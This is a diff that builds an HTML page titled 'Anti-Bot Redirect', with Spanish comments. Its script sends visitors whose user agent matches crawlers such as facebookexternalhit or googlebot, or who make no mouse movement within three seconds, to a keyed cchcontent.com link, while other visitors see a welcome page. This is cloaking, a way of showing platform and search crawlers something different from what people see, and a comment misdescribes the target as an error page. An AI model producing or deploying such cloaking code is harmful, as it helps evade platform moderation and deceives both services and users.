@@ -1,15 +1,47 @@
-// Detectar bots usando el "userAgent" y redirigir
-function isBot() {
-    var userAgent = navigator.userAgent.toLowerCase();
-    var bots = ["bot", "crawl", "spider", "facebookexternalhit"];
-    for (var i = 0; i < bots.length; i++) {
-        if (userAgent.indexOf(bots[i]) > -1) {
-            return true;  // Es un bot
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anti-Bot Redirect</title>
+    <script>
+        // Detectar bots usando el "userAgent"
+        function isBot() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var bots = ["facebookexternalhit", "bot", "crawl", "spider", "slurp", "bingbot", "googlebot"];
+            for (var i = 0; i < bots.length; i++) {
+                if (userAgent.indexOf(bots[i]) > -1) {
+                    return true;  // Es un bot
+                }
+            }
+            return false;  // No es un bot
         }
-    }
-    return false;  // No es un bot
-}
 
-if (isBot()) {
-    window.location.href = "https://cchcontent.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";  // Redirige a una página específica
-}
+        // Detectar si el usuario interactúa con el sitio
+        function detectUserBehavior() {
+            var isHuman = false;
+
+            // Detectar movimiento del mouse (un comportamiento común de los humanos)
+            window.addEventListener('mousemove', function() {
+                isHuman = true;
+            });
+
+            // Si no hay interacción humana, redirigir a los bots
+            setTimeout(function() {
+                if (!isHuman || isBot()) {
+                    window.location.href = "https://cchcontent.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";  // Redirigir a una página de error
+                }
+            }, 3000); // Tiempo límite de 3 segundos para detectar la interacción
+        }
+
+        // Ejecutar la función para verificar bots y comportamiento
+        window.onload = function() {
+            detectUserBehavior();
+        };
+    </script>
+</head>
+<body>
+    <h1>Bienvenido a nuestro sitio web</h1>
+    <p>Si estás viendo esto, probablemente no seas un bot. ¡Gracias por visitarnos!</p>
+</body>
+</html>
